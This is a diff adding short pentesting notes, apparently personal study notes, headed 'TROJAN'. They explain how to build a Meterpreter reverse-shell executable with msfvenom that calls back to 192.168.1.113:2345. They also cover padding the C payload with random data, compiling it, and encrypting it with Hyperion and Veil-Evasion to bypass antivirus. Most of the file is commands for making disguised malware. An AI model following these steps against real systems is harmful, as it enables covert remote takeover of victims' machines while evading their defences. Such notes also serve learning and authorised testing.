@@ -1,0 +1,60 @@
+
+-------------
+ T R O J A N | 
+-------------
+
+Create the payload in Msfvenom with the -f fla to c to create hex bytes, so we drop them on our c program file:
+
+	#: 
+	
+
+To add some randomness on Linux we can use /dev/urandom file, generates data using entropy in the Linux System, but we will need to use tr since we will get a lot of unprintable characters:
+(-c512 is to pring the first 512 first charactes)
+
+	#: tr -dc A-Z-a-z-0-9
+	#: cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512
+
+Now, we need to put the random data on our c program, and the payload data on the shell field.
+
+Once we've done this, its time to compile our file:
+	#: gcc -o custommpeterpreter.exe custommeterpreter.c	
+
+
+[ENCRYPTING EXECUTIBLES WITH HYPERION]
+
+Another way to obfuscaate our payload is to encrypt it, we can use Hyperion (AES encrpytion)
+	#: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=2345 -f exe > meterpreter.exe
+
+(*) To create a hyperon.exe executable, we need to Hyperon on windows, compile it, and send it baack to our machine.
+
+
+[ENCRYPTING EXECUTABLE WITH VEIL-EVASION]
+
+Uses Python injection technique, providing encryption combined with AES encryption.
+
+	#: ./Veil.py
+	#: use 1 (Bypass Antivirus)	
+	#: list (Show all the payloads)
+
+	...	
+	28)	python/meterpreter/rev_tcp.py
+	29)	python/shellcode_inject/aes_encrypt.py
+	30)	python/shellcode_inject/arc_encrypt.py
+	...
+
+	#: use 29
+	#: generate
+	#: 2 (Use msfvenom)		
+	
+
+
+
+
+
+
+
+
+
+
+
+
